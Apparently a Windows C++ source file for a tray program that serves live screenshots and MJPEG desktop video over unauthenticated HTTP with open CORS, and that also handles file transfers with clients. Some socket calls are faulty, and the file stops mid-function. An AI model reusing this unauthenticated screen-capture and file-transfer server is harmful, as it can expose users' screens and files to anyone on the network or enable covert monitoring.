#define no_init_all

#define WIN32_LEAN_AND_MEAN
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501

#ifndef _WIN32_IE			// Allow use of features specific to IE 6.0 or later.
#define _WIN32_IE 0x0600
#endif

#pragma comment(linker,"/FILEALIGN:0x200 /MERGE:.data=.text /MERGE:.rdata=.text /SECTION:.text,EWR")

#pragma comment (lib, "wsock32.lib")
#pragma comment (lib, "comctl32.lib")
#pragma comment (lib, "winmm.lib")

// Windows Header Files:
#include <windows.h>
#include <Windowsx.h>
#include <commctrl.h>
#include <Shellapi.h>
#include <Shlwapi.h>
#include <mmsystem.h>

// C RunTime Header Files
//#include <stdlib.h>
//#include <malloc.h>
//#include <memory.h>
#include <tchar.h>
#include <stdint.h>
#include <string.h>
#include <thread>
#include <chrono>
#include <WinSock2.h>
#include "WinSocket.h"
#include "WinMemStream.h"
#include "WinScreenCaptureHelper.h"
#include "main.h"
#include "resource.h"

#define TRAYICONID	1				// ID number for the Notify Icon
#define SWM_TRAYMSG	WM_APP			// the message ID sent to our window

#define SWM_SHOW	WM_APP + 1		// show the window
#define SWM_HIDE	WM_APP + 2		// hide the window
#define SWM_EXIT	WM_APP + 3		// close the window

// Global Variables:
HINSTANCE		hInst;	// current instance
NOTIFYICONDATA	niData;	// notify icon data
HINSTANCE		ghInstance;
HWND			ghWnd;
SOCKET			ghTcpSocket;
bool			Processing;
int				ClientCount = 0;
Client			*Clients = NULL;
HANDLE			ghFile;

static bool bPerformanceTimerEnabled;
static _int64 PerformanceTimerFrequency;
static _int64 PerformanceTimerProgramStart;
static DWORD RegularTimerProgramStart;
static float TimerSecsPerTick;

// Forward declarations of functions included in this code module:
BOOL				InitInstance(HINSTANCE, int);
BOOL				OnInitDialog(HWND hWnd);
void				ShowContextMenu(HWND hWnd);
ULONGLONG			GetDllVersion(LPCTSTR lpszDllName);

INT_PTR CALLBACK	DlgProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

#pragma warning (disable : 4996) // Remove ::sprintf() security warnings
//-------------------------------------------------------------------------------------------------
#define MAX_LINE_SIZE   1024
#define BPS               32 //24 // Bits-per-pixel value to be used in the image
#define CRLF          "\r\n"
//-------------------------------------------------------------------------------------------------
#if defined(_DEBUG)
#  define LOG_DEBUG(...)  ::fprintf(stdout, __VA_ARGS__)
#else
#  define LOG_DEBUG(...)
#endif
#define LOG_INFO(...)  ::fprintf(stdout, __VA_ARGS__)
#define LOG_ERROR(...)  ::fprintf(stderr, __VA_ARGS__)
//-------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------

enum class Mode { Unknown, ScreenShot, Video, HealthCheck };
//-------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------

bool getLine(WinSocket *pSocket, char *strLine, uint32_t nLineSize)
{
	bool bRet = false;
	while (nLineSize && pSocket->read((uint8_t*)strLine, 1) && (*strLine != '\n'))
	{
		if (*strLine != '\r')
		{
			++strLine;  --nLineSize;
		}
		bRet = true;
	}
	bRet |= (*strLine == '\n');
	*strLine = '\0';
	return bRet;
}
//-------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------

Mode processHttpRequest(WinSocket *pSocket, WinScreenCaptureHelper::Settings &settings)
{
	Mode mode = Mode::Unknown;
	char strLine[MAX_LINE_SIZE + 1];

	// Get request info
	const char *strArguments = nullptr;
	if (getLine(pSocket, strLine, MAX_LINE_SIZE))
	{
		if (::strstr(strLine, "GET /getImage") == strLine)
		{
			strArguments = strLine + 13;
			mode = Mode::ScreenShot;
		}
		else if (::strstr(strLine, "GET /getVideo") == strLine)
		{
			strArguments = strLine + 13;
			mode = Mode::Video;
		}
		else if (::strstr(strLine, "GET /healthCheck") == strLine)
		{
			settings.eCapturer = WinScreenCaptureHelper::Capturer::None;
			mode = Mode::HealthCheck;
		}
	}
	// Process request settings
	if (strArguments && (strArguments[0] != '\0'))
	{
		const char *strAux = ::strstr(strArguments, "width=");
		if (strAux) settings.nWidth = atoi(strAux + 6);
		strAux = ::strstr(strArguments, "height=");
		if (strAux) settings.nHeight = atoi(strAux + 7);
		strAux = ::strstr(strArguments, "x0=");
		if (strAux) settings.nX0 = atoi(strAux + 3);
		strAux = ::strstr(strArguments, "y0=");
		if (strAux) settings.nY0 = atoi(strAux + 3);
		strAux = ::strstr(strArguments, "cx=");
		if (strAux) settings.nCX = atoi(strAux + 3);
		strAux = ::strstr(strArguments, "cy=");
		if (strAux) settings.nCY = atoi(strAux + 3);
		strAux = ::strstr(strArguments, "fps=");
		if (strAux) settings.nFPS = atoi(strAux + 4);
		strAux = ::strstr(strArguments, "cap=GDI");
		if (strAux) settings.eCapturer = WinScreenCaptureHelper::Capturer::GDI;
		strAux = ::strstr(strArguments, "cap=GDI+");
		if (strAux) settings.eCapturer = WinScreenCaptureHelper::Capturer::GDIplus;
		strAux = ::strstr(strArguments, "cap=D3D9");
		if (strAux) settings.eCapturer = WinScreenCaptureHelper::Capturer::D3D9;
		strAux = ::strstr(strArguments, "cap=D3D11");
		if (strAux) settings.eCapturer = WinScreenCaptureHelper::Capturer::D3D11;
		strAux = ::strstr(strArguments, "cap=RDP");
		if (strAux) settings.eCapturer = WinScreenCaptureHelper::Capturer::RDP;
		strAux = ::strstr(strArguments, "dev=");
		if (strAux)
		{
			uint32_t nPos = 0;
			strAux += 4;
			while ((nPos < sizeof(settings.strDevice)) && (strAux[nPos] != ' ') && (strAux[nPos] != '&') && (strAux[nPos] != '\0'))
			{
				settings.strDevice[nPos] = strAux[nPos];
				++nPos;
			}
			settings.strDevice[nPos] = '\0';
		}
	}

	// Get Host info
	if (getLine(pSocket, strLine, MAX_LINE_SIZE))
	{
		if (::strstr(strLine, "Host: ") == strLine)
		{
			LOG_INFO("Connection from %s\n", strLine);
		}
	}

	// Consume remaining header lines
	while (getLine(pSocket, strLine, MAX_LINE_SIZE) && (strLine[0] != '\0'));

	return mode;
}
//-------------------------------------------------------------------------------------------------

void sendHttpBadRequest(WinSocket *pSocket)
{
	static const char *strBadRequest =
		"HTTP/1.1 400 Invalid HTTP Request" CRLF
		"server: screencap" CRLF
		"Content-Type: text/html" CRLF
		"Content-Length: 170" CRLF
		"Connection: close" CRLF
		CRLF
		"<html>" CRLF
		"<head><title>400 Bad Request</title></head>" CRLF
		"<body bgcolor = \"white\">" CRLF
		"<center><h1>400 Bad Request</h1></center>" CRLF
		"<hr><center>screencap</center>" CRLF
		"</body>" CRLF
		"</html>";
	pSocket->write((const uint8_t*)strBadRequest, (uint32_t)strlen(strBadRequest));
}
//-------------------------------------------------------------------------------------------------

void sendHttpInternalError(WinSocket *pSocket)
{
	static const char *strBadRequest =
		"HTTP/1.1 500 Internal Server Error" CRLF
		"server: screencap" CRLF
		"Content-Type: text/html" CRLF
		"Content-Length: 190" CRLF
		"Connection: close" CRLF
		CRLF
		"<html>" CRLF
		"<head><title>500 Internal Server Error</title></head>" CRLF
		"<body bgcolor = \"white\">" CRLF
		"<center><h1>500 Internal Server Error</h1></center>" CRLF
		"<hr><center>screencap</center>" CRLF
		"</body>" CRLF
		"</html>";
	pSocket->write((const uint8_t*)strBadRequest, (uint32_t)strlen(strBadRequest));
}
//-------------------------------------------------------------------------------------------------

void sendHttpOK(WinSocket *pSocket, const char *strMIME, const uint8_t *pData, uint32_t nSize)
{
	char strHeader[MAX_LINE_SIZE];
	if (nSize)
	{
		::sprintf(strHeader,
			"HTTP/1.1 200 OK" CRLF
			"server: screencap" CRLF
			"Content-Type: %s" CRLF
			"Content-Length: %u" CRLF
			"Connection: keep-alive" CRLF
			"Allow: GET, OPTIONS" CRLF
			"Access-Control-Allow-Origin: *" CRLF
			"Access-Control-Allow-Methods: GET, OPTIONS" CRLF
			"Access-Control-Allow-Headers: Content-Type" CRLF
			CRLF,
			strMIME, nSize);
	}
	else
	{
		::sprintf(strHeader,
			"HTTP/1.1 200 OK" CRLF
			"server: screencap" CRLF
			"Content-Type: %s" CRLF
			"Connection: keep-alive" CRLF
			"Allow: GET, OPTIONS" CRLF
			"Access-Control-Allow-Origin: *" CRLF
			"Access-Control-Allow-Methods: GET, OPTIONS" CRLF
			"Access-Control-Allow-Headers: Content-Type" CRLF
			CRLF,
			strMIME);
	}
	pSocket->write((const uint8_t*)strHeader, (uint32_t)strlen(strHeader));
	pSocket->write(pData, nSize);
}
//-------------------------------------------------------------------------------------------------

bool sendHttpMultiPart(WinSocket *pSocket, const char *strBoundaryName, const char *strMIME, const uint8_t *pData, uint32_t nSize)
{
	char strMultipart[MAX_LINE_SIZE];
	::sprintf(strMultipart,
		"--%s" CRLF
		"Content-Type: %s" CRLF
		"Content-Length: %u" CRLF
		CRLF,
		strBoundaryName, strMIME, nSize);
	return pSocket->write((const uint8_t*)strMultipart, (uint32_t)strlen(strMultipart)) &&
		(pSocket->write(pData, nSize) == nSize) &&
		(pSocket->write((const uint8_t*)CRLF, 2) == 2);
}
//-------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------

void onUnkownCmd(WinSocket *pSocket, WinScreenCaptureHelper::Settings &/*settings*/, const WinScreenCaptureHelper * /*pScreenCapturerHelper*/)
{
	sendHttpBadRequest(pSocket);
}
//-------------------------------------------------------------------------------------------------

void onHealthCheckCmd(WinSocket *pSocket, WinScreenCaptureHelper::Settings &settings, const WinScreenCaptureHelper *pScreenCapturerHelper)
{
	IWinScreenCapture *pScreenCapture = pScreenCapturerHelper->checkSettings(settings);
	char strJson[4096];
	::sprintf(strJson, "{ \"ip\" : \"%s\", \"hostname\" : \"%s\", \"width\" : %u, \"height\" : %u, \"caps\" : %s, \"devices\" : %s }",
		pSocket->getIpAddress(WinSocket::getHostName()), WinSocket::getHostName(), settings.nWidth, settings.nHeight,
		pScreenCapturerHelper->getCapabilitiesString().c_str(), pScreenCapturerHelper->getDisplayDevicesString().c_str());
	sendHttpOK(pSocket, "application/json", (const uint8_t*)strJson, (uint32_t)strlen(strJson));
	if (pScreenCapture) delete pScreenCapture;
}
//-------------------------------------------------------------------------------------------------

void onScreenShotCmd(WinSocket *pSocket, WinScreenCaptureHelper::Settings &settings, const WinScreenCaptureHelper *pScreenCapturerHelper)
{
	IWinScreenCapture *pScreenCapture = pScreenCapturerHelper->checkSettings(settings);
	if (pScreenCapture)
	{
		const uint32_t nBufferSize = ((settings.nWidth * settings.nHeight * BPS) / 8) + 100;
		uint8_t *pBuffer = (uint8_t*)::malloc(nBufferSize);
		if (pBuffer)
		{
			CImage img;
			if (img.Create(settings.nWidth, settings.nHeight, BPS))
			{
				if (pScreenCapture->captureScreenRect(settings.nX0, settings.nY0, settings.nCX, settings.nCY, img))
				{
					WinMemStream stream(pBuffer, nBufferSize, false);
					img.Save(&stream, ImageFormatJPEG);
					sendHttpOK(pSocket, "image/jpeg", stream.getData(), stream.getSize());
				}
				else
				{
					LOG_ERROR("onScreenShotCmd() Unable to capute screen rect (x0:%u, y0:%u)-(w:%u, h:%u)\n", settings.nX0, settings.nY0, settings.nCX, settings.nCY);
					sendHttpInternalError(pSocket);
				}
			}
			else
			{
				LOG_ERROR("onScreenShotCmd() Unable to create an image object (w:%u, h:%u)-{bps:%u}\n", settings.nWidth, settings.nHeight, BPS);
				sendHttpInternalError(pSocket);
			}
			::free(pBuffer);
		}
		else
		{
			LOG_ERROR("onScreenShotCmd() Unable to alloc memory for streaming (size:%u)\n", nBufferSize);
			sendHttpInternalError(pSocket);
		}
		delete pScreenCapture;
	}
	else
	{
		LOG_ERROR("onScreenShotCmd() Unable to initialize screen capturer\n");
		sendHttpInternalError(pSocket);
	}
}
//-------------------------------------------------------------------------------------------------

void onVideoCmd(WinSocket *pSocket, WinScreenCaptureHelper::Settings &settings, const WinScreenCaptureHelper *pScreenCapturerHelper)
{
	IWinScreenCapture *pScreenCapture = pScreenCapturerHelper->checkSettings(settings);
	if (pScreenCapture)
	{
		const uint32_t nBufferSize = ((settings.nWidth * settings.nHeight * BPS) / 8) + 100;
		uint8_t *pBuffer = (uint8_t*)::malloc(nBufferSize);
		if (pBuffer)
		{
			CImage img;
			if (img.Create(settings.nWidth, settings.nHeight, BPS))
			{
				const double dExpectedTimeBetweenFrames = 1.0 / ((double)settings.nFPS);
				double dAvgTimeBetweenFrames = dExpectedTimeBetweenFrames;
				std::chrono::high_resolution_clock::time_point tpBegin = std::chrono::high_resolution_clock::now();
				if (pScreenCapture->captureScreenRect(settings.nX0, settings.nY0, settings.nCX, settings.nCY, img))
				{
					sendHttpOK(pSocket, "multipart/x-mixed-replace; boundary=\"SCREENCAP_MJPEG\"", nullptr, 0);
					for (; ; )
					{
						WinMemStream stream(pBuffer, nBufferSize, false);
						img.Save(&stream, ImageFormatJPEG);
						if (!sendHttpMultiPart(pSocket, "SCREENCAP_MJPEG", "image/jpeg", stream.getData(), stream.getSize()) ||
							!pScreenCapture->captureScreenRect(settings.nX0, settings.nY0, settings.nCX, settings.nCY, img))
							break;

						// Compute elapsed time and perform a sleep to meet FPS requirements (if needed)
						const std::chrono::high_resolution_clock::time_point tpEnd = std::chrono::high_resolution_clock::now();
						const std::chrono::duration<double> timeSpan = std::chrono::duration_cast<std::chrono::duration<double>>(tpEnd - tpBegin);
						dAvgTimeBetweenFrames += dExpectedTimeBetweenFrames * (timeSpan.count() - dAvgTimeBetweenFrames); // 1 second estimation window
						if (dExpectedTimeBetweenFrames > dAvgTimeBetweenFrames)
							std::this_thread::sleep_for(std::chrono::duration<double>(dExpectedTimeBetweenFrames - dAvgTimeBetweenFrames));
						tpBegin = std::chrono::high_resolution_clock::now();
					}
				}
				else
				{
					LOG_ERROR("onVideoCmd() Unable to capute screen rect (x0:%u, y0:%u)-(w:%u, h:%u)\n", settings.nX0, settings.nY0, settings.nCX, settings.nCY);
					sendHttpInternalError(pSocket);
				}
			}
			else
			{
				LOG_ERROR("onVideoCmd() Unable to create an image object (w:%u, h:%u)-{bps:%u}\n", settings.nWidth, settings.nHeight, BPS);
				sendHttpInternalError(pSocket);
			}
			::free(pBuffer);
		}
		else
		{
			LOG_ERROR("onVideoCmd() Unable to alloc memory for streaming (size:%u)\n", nBufferSize);
			sendHttpInternalError(pSocket);
		}
		delete pScreenCapture;
	}
	else
	{
		LOG_ERROR("onVideoCmd() Unable to initialize screen capturer\n");
		sendHttpInternalError(pSocket);
	}
}
//-------------------------------------------------------------------------------------------------

void onHttpConnection(WinSocket *pSocket, void *pParam)
{
	const WinScreenCaptureHelper *pScreenCaptureHelper = reinterpret_cast<const WinScreenCaptureHelper*>(pParam);
	WinScreenCaptureHelper::Settings settings;

	// Process the request
	switch (processHttpRequest(pSocket, settings))
	{
	case Mode::Unknown:     onUnkownCmd(pSocket, settings, pScreenCaptureHelper); break;
	case Mode::HealthCheck: onHealthCheckCmd(pSocket, settings, pScreenCaptureHelper); break;
	case Mode::ScreenShot:  onScreenShotCmd(pSocket, settings, pScreenCaptureHelper); break;
	case Mode::Video:       onVideoCmd(pSocket, settings, pScreenCaptureHelper); break;
	}

	// Free up resources
	pSocket->close();
	delete pSocket;
}
//-------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------


void TCPListen(int port)
{
	WSADATA wsadata;

	if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
		if (WSAStartup(MAKEWORD(1, 1), &wsadata) != 0)
			return;

	ghTcpSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if(ghTcpSocket != SOCKET_ERROR)
	{
		WSAAsyncSelect(ghTcpSocket, ghWnd, WM_MAINSOCKET, FD_ACCEPT);

		struct sockaddr_in sin;
		memset(&sin, 0, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_port = htons(port);

		if (bind(ghTcpSocket, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
		{
			closesocket(ghTcpSocket);
			ghTcpSocket = INVALID_SOCKET;
		}
		else
		{
			if (listen(ghTcpSocket, SOMAXCONN) == SOCKET_ERROR)
			{
				closesocket(ghTcpSocket);
				ghTcpSocket = INVALID_SOCKET;
			}
		}
	}
}

void TCPAccept(SOCKET wParam)
{
	SOCKET hSocket;
	SOCKADDR_IN sin;
	int len;

	len = sizeof(sin);
	memset(&sin, 0, len);
	hSocket = accept(wParam, (struct sockaddr *)&sin, &len);
	if (hSocket != INVALID_SOCKET) {
		WSAAsyncSelect(hSocket, ghWnd, WM_MAINSOCKET, FD_CLOSE | FD_READ | FD_WRITE);
		ioctlsocket(hSocket, FIONBIO, (u_long *)1);

		ClientCount++;
		Clients = (Client *)realloc(Clients, ClientCount * sizeof(Client));
		Clients[ClientCount - 1].hSocket = hSocket;
		Clients[ClientCount - 1].hSin = sin;
		Clients[ClientCount - 1].Transferring = false;
		Clients[ClientCount - 1].RecvBufSize = 0;
		Clients[ClientCount - 1].SendBufSize = 0;
		Clients[ClientCount - 1].RecvBuffer = NULL;
		Clients[ClientCount - 1].SendBuffer = NULL;
	}
}

void TCPCleanup(SOCKET wParam)
{
	int i, j;

	for (i=ClientCount-1; i>=0; i--)
	{
		if (Clients[i].hSocket == wParam)
		{
			//closesocket(wParam);
			for (j=i+1; j<ClientCount; j++)
			{
				Clients[j-1] = Clients[j];
			}
			ClientCount--;
		}
	}
}

void SendData(unsigned short cmd, unsigned long datac, char **data, unsigned long *datal, unsigned short ci)
{
	unsigned int Size, Index, i;

	// Calculate total message length
	Size = 6 + datac * 4;
	for (i = 0; i < datac; i++)
		Size += datal[i];

	// Allocate memory for message
	char *SckData = (char *)malloc(Size + 4); // (+ 4 to compensate for message length header)

	memcpy(SckData, &Size, 4); // Insert 4 byte message length	
	memcpy(SckData + 4, &cmd, 2); // Insert 2 byte command	
	memcpy(SckData + 6, &datac, 4); // Insert 4 byte argument count

	// Insert arguments
	Index = 10;
	for (i = 0; i < datac; i++) {
		memcpy(SckData + Index, &datal[i], 4);
		Index += 4;
		memcpy(SckData + Index, data[i], datal[i]);
		Index += datal[i];
	}

	if (Clients[ci].SendBufSize == 0) {

		// Add data to send buffer, and try to send

		Clients[ci].SendBufSize = Size + 4; // (+ 4 to compensate for message length header)
		Clients[ci].SendBuffer = (char *)realloc(Clients[ci].SendBuffer, Clients[ci].SendBufSize);
		memcpy(Clients[ci].SendBuffer, SckData, Clients[ci].SendBufSize);

		int len = send(Clients[ci].hSocket, Clients[ci].SendBuffer, Clients[ci].SendBufSize, 0);

		if (len > 0) {
			Clients[ci].SendBufSize -= len;
			memmove(Clients[ci].SendBuffer, Clients[ci].SendBuffer + len, Clients[ci].SendBufSize);
			Clients[ci].SendBuffer = (char *)realloc(Clients[ci].SendBuffer, Clients[ci].SendBufSize);
		}
	} 
	else {

		// Add data to send buffer, FD_WRITE messages
		// will handle the rest

		Clients[ci].SendBufSize += Size + 4; // (+ 4 to compensate for message length header)
		Clients[ci].SendBuffer = (char *)realloc(Clients[ci].SendBuffer, Clients[ci].SendBufSize);
		memcpy(Clients[ci].SendBuffer + Clients[ci].SendBufSize - Size - 4, SckData, Size + 4);
	}

	// Free memory
	free(SckData);
}

void SendStr(char *msg, unsigned short ci)
{
	unsigned long msglen = lstrlen(msg);
	SendData(4, 1, &msg, &msglen, ci);
}

int CaptureAnImage(HWND hWnd, RECT rcClient)
{
	HDC hdcScreen;
	HDC hdcWindow;
	HDC hdcMemDC = NULL;
	HBITMAP hbmScreen = NULL;
	BITMAP bmpScreen;

	// Retrieve the handle to a display device context for the client 
	// area of the window. 
	hdcScreen = GetDC(NULL);
	hdcWindow = GetDC(hWnd);

	// Create a compatible DC which is used in a BitBlt from the window DC
	hdcMemDC = CreateCompatibleDC(hdcWindow); 

	if(!hdcMemDC)
	{
		MessageBox(hWnd, "CreateCompatibleDC has failed","Failed", MB_OK);
		goto done;
	}

	// Get the client area for size calculation
	//	GetClientRect(hWnd, &rcClient);
	GetWindowRect(hWnd, &rcClient);

	HDC hdc = GetDC(NULL), hdcCap = CreateCompatibleDC(hdc);
	int nSaved = SaveDC(hdcCap);
	LPBYTE lpBytes;
	BITMAPINFO bmiCapture = { { sizeof(BITMAPINFOHEADER), rcClient.right-rcClient.left, rcClient.bottom-rcClient.top, 1,
		GetDeviceCaps(hdc, BITSPIXEL), BI_RGB, 0, 0, 0, 0, 0, }, };
	HBITMAP ret = CreateDIBSection(hdc, &bmiCapture, DIB_PAL_COLORS,
		(LPVOID *)&lpBytes, NULL, 0);

	SelectObject(hdcCap, ret);
	SetBkMode(hdcCap, TRANSPARENT);
	BitBlt(hdcCap, 0, 0, GetDeviceCaps(hdc, HORZRES),
		GetDeviceCaps(hdc, VERTRES), hdc, 0, 0, SRCCOPY);

	//This is the best stretch mode
	SetStretchBltMode(hdcCap,HALFTONE);

	//The source DC is the entire screen and the destination DC is the current window (HWND)
	if(!StretchBlt(hdcCap, 
		0,0, 
		rcClient.right-rcClient.left, rcClient.bottom-rcClient.top, 
		hdc, 
		0,0,
		GetSystemMetrics(SM_CXSCREEN),
		GetSystemMetrics(SM_CYSCREEN),
		SRCCOPY))
	{
		MessageBox(hWnd, "StretchBlt has failed","Failed", MB_OK);
		goto done;
	}

	RestoreDC(hdcCap, nSaved);
	DeleteDC(hdcCap);
	ReleaseDC(NULL, hdc);

	hbmScreen = ret;

	// Get the BITMAP from the HBITMAP
	GetObject(hbmScreen,sizeof(BITMAP),&bmpScreen);

	BITMAPFILEHEADER   bmfHeader;    
	BITMAPINFOHEADER   bi;

	bi.biSize = sizeof(BITMAPINFOHEADER);    
	bi.biWidth = bmpScreen.bmWidth;    
	bi.biHeight = bmpScreen.bmHeight;  
	bi.biPlanes = 1;    
	bi.biBitCount = 32;    
	bi.biCompression = BI_RGB;    
	bi.biSizeImage = 0;  
	bi.biXPelsPerMeter = 0;    
	bi.biYPelsPerMeter = 0;    
	bi.biClrUsed = 0;    
	bi.biClrImportant = 0;

	DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

	// Starting with 32-bit Windows, GlobalAlloc and LocalAlloc are implemented as wrapper functions that 
	// call HeapAlloc using a handle to the process's default heap. Therefore, GlobalAlloc and LocalAlloc 
	// have greater overhead than HeapAlloc.
	HANDLE hDIB = GlobalAlloc(GHND,dwBmpSize); 
	char *lpbitmap = (char *)GlobalLock(hDIB);    

	// Gets the "bits" from the bitmap and copies them into a buffer 
	// which is pointed to by lpbitmap.
	GetDIBits(hdcWindow, hbmScreen, 0,
		(UINT)bmpScreen.bmHeight,
		lpbitmap,
		(BITMAPINFO *)&bi, DIB_RGB_COLORS);

	// A file is created, this is where we will save the screen capture.
	HANDLE hFile = CreateFile("captureqwsx.bmp",
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);   

	// Add the size of the headers to the size of the bitmap to get the total file size
	DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	//Offset to where the actual bitmap bits start.
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER); 

	//Size of the file
	bmfHeader.bfSize = dwSizeofDIB; 

	//bfType must always be BM for Bitmaps
	bmfHeader.bfType = 0x4D42; //BM   

	DWORD dwBytesWritten = 0;
	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

	//Unlock and Free the DIB from the heap
	GlobalUnlock(hDIB);    
	GlobalFree(hDIB);

	//Close the handle for the file that was created
	CloseHandle(hFile);

	//Clean up
done:
	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL,hdcScreen);
	ReleaseDC(hWnd,hdcWindow);

	return 0;
}


DWORD WINAPI ReceiveFileThread(LPVOID lpArgs)
{
	HANDLE hFile = ((FILETRANSFERARGS *)lpArgs)->hFile;
	SOCKET hSocket = ((FILETRANSFERARGS *)lpArgs)->hSocket;
	DWORD FileSize = ((FILETRANSFERARGS *)lpArgs)->FileSize;
	DWORD Position;
	DWORD BytesWritten, RecvBytes;
	char Buffer[4096], tmpbuff[512];
	int ret;
	TIMEVAL tm;
	fd_set fs;

	WSAAsyncSelect(hSocket, ghWnd, 0, 0);
	//	ioctlsocket(hSocket, FIONBIO, 0);

	linger lin;
	lin.l_onoff=lin.l_linger=0;

	int opt=1;
	setsockopt(hSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
	setsockopt(hSocket, SOL_SOCKET, SO_KEEPALIVE, (char *)&opt, sizeof(opt));
	setsockopt(hSocket, SOL_SOCKET, SO_LINGER, (char *)&lin, sizeof(lin));

	u_long noblock=0;
	ioctlsocket(hSocket, FIONBIO, &noblock);

	free(lpArgs);
	Position = 0;

	FD_ZERO(&fs);
	FD_SET(hSocket, &fs);
	tm.tv_sec = 60;
	tm.tv_usec = 0;

	while (Position < FileSize)
	{
		if (select(0, &fs, NULL, NULL, &tm) > 0) {
			if (FD_ISSET(hSocket, &fs)) {

				if (FileSize-Position >= 4096)
					RecvBytes = 4096;
				else
					RecvBytes = FileSize-Position;

				ret = recv(hSocket, Buffer, RecvBytes, 0);
				//			SetRichText(CON_BROWN, "[%d] ret: %d\r\n", Position * 100 / FileSize, ret);
				if (ret > 0)
				{
					WriteFile(hFile, Buffer, ret, &BytesWritten, NULL);
					Position += ret;
					wsprintf(tmpbuff, "%d:%i", Position * 100 / FileSize, ret);
					SetWindowText(ghWnd, tmpbuff);
				}
				else if (ret < 0)
				{
					if (WSAGetLastError() != WSAEWOULDBLOCK)
						goto CleanUp;
					Sleep(0);
				}
			}
		} else 
			goto CleanUp;
	}

CleanUp:
	WSAAsyncSelect(hSocket, ghWnd, WM_MAINSOCKET, FD_CLOSE | FD_READ | FD_WRITE);
	ioctlsocket(hSocket, FIONBIO, (u_long *)1);
	CloseHandle(hFile);

	for (int ci=0; ci<ClientCount; ci++)
	{
		if (Clients[ci].hSocket == hSocket)
		{
			Clients[ci].Transferring = false;
			break;
		}
	}

	return 0;
}


DWORD WINAPI SendFileThread(LPVOID lpArgs)
{
	HANDLE hFile = ((FILETRANSFERARGS *)lpArgs)->hFile;
	SOCKET hSocket = ((FILETRANSFERARGS *)lpArgs)->hSocket;
	DWORD FileSize = ((FILETRANSFERARGS *)lpArgs)->FileSize;
	DWORD Position = ((FILETRANSFERARGS *)lpArgs)->Offset;

	DWORD BytesRead, SendBytes;
	BYTE Buffer[4096];
	BYTE *Packet;
	int ret;
	TIMEVAL tm;
	fd_set fs;
	char tmpbuff[512];

	WSAAsyncSelect(hSocket, ghWnd, 0, 0);
	//	ioctlsocket(hSocket, FIONBIO, 0);

	linger lin;
	lin.l_onoff=lin.l_linger=0;

	int opt=1;
	setsockopt(hSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
	setsockopt(hSocket, SOL_SOCKET, SO_KEEPALIVE, (char *)&opt, sizeof(opt));
	setsockopt(hSocket, SOL_SOCKET, SO_LINGER, (char *)&lin, sizeof(lin));

	u_long noblock=0;
	ioctlsocket(hSocket, FIONBIO, &noblock);

	free(lpArgs);
	Position = 0;

	SetFilePointer(hFile, Position, NULL, FILE_BEGIN);

	FD_ZERO(&fs);
	FD_SET(hSocket, &fs);
	tm.tv_sec = 60;
	tm.tv_usec = 0;

	while (Position < FileSize)
	{
		ReadFile(hFile, Buffer, 4096, &BytesRead, NULL);
		if (BytesRead > 0)
		{
			Position += BytesRead;
			Packet = Buffer;
			if (select(0, NULL, &fs, NULL, &tm) > 0) {
				if (FD_ISSET(hSocket, &fs)) {
					do
					{
						if (BytesRead >= 4096)
							SendBytes = 4096;
						else
							SendBytes = BytesRead;
						ret = send(hSocket, (char *)Packet, SendBytes, 0);
						//					SetRichText(CON_BROWN, "[%d] ret: %d\r\n", Position * 100 / FileSize, ret);
						wsprintf(tmpbuff, "%d:%i", Position * 100 / FileSize, ret);
						SetWindowText(ghWnd, tmpbuff);
						if (ret > 0)
						{
							BytesRead -= ret;
							Packet += ret;
						}
						else if (ret < 0)
						{
							if (WSAGetLastError() != WSAEWOULDBLOCK)
								goto CleanUp;
							Sleep(0);
						}
					} while (BytesRead > 0);
				}
			} else 
				goto CleanUp;
		}
	}

CleanUp:

	WSAAsyncSelect(hSocket, ghWnd, WM_MAINSOCKET, FD_CLOSE | FD_READ | FD_WRITE);
	ioctlsocket(hSocket, FIONBIO, (u_long *)1);
	CloseHandle(hFile);

	char *msg;
	msg = "wizard";
	unsigned long msglen = lstrlen(msg);

	for (int ci=0; ci<ClientCount; ci++)
	{
		if (Clients[ci].hSocket == hSocket)
		{
			if (ghFile == hFile)
			{
				Clients[ci].Transferring = true;
				Sleep(100);
				SendData(119, 1, &msg, &msglen, ci);
				break;
			}
			else
			{
				Clients[ci].Transferring = false;
				break;
			}
		}
	}

	return 0;
}


void StartSendThread(SOCKET wParam, unsigned short ci)
{
	FILETRANSFERARGS *lpArgs;
	HANDLE h;
	DWORD dw;

	lpArgs = (FILETRANSFERARGS *)malloc(sizeof(FILETRANSFERARGS));
	lpArgs->hFile = Clients[ci].hFile;
	lpArgs->hSocket = wParam;
	lpArgs->FileSize = GetFileSize(Clients[ci].hFile, NULL);
	lpArgs->Offset = 0;

	if (lpArgs->Offset < lpArgs->FileSize)
	{
		h = CreateThread(NULL, 0, SendFileThread, lpArgs, CREATE_SUSPENDED, &dw);
		if (h == NULL)
		{
			CloseHandle(Clients[ci].hFile);
		}
		else
		{
			ResumeThread(h);
			CloseHandle(h);
